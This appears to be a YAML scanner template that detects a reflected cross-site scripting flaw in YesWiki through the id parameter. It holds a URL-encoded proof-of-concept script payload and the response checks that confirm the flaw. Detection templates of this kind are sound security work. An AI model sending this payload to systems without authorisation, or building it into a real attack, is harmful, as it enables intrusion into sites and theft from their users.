id: yeswiki-xss
brief:
    title: YesWiki <2022-07-07 - Cross-Site Scripting
    by: arafatansari
    level: medium
    about: YesWiki before 2022-07-07 contains a cross-site scripting vulnerability via the id parameter in the AccueiL URL.
    label:
        - yeswiki
        - huntr
        - xss
        - vuln
    score: CVSS:6.5
moves:
    - verb: GET
      to:
        - '{{BaseURL}}/?PagePrincipale/rss&id=1%27%3Cscript%3Ealert(document.domain)%3C/script%3E'
      signs:
        - "on": word
          has:
            - <script>alert(document.domain)</script>
            - 'Query failed:'
          in: body
          need: all
        - "on": word
          has:
            - text/html
          in: header
          need: all
        - "on": status
          status:
            - 200
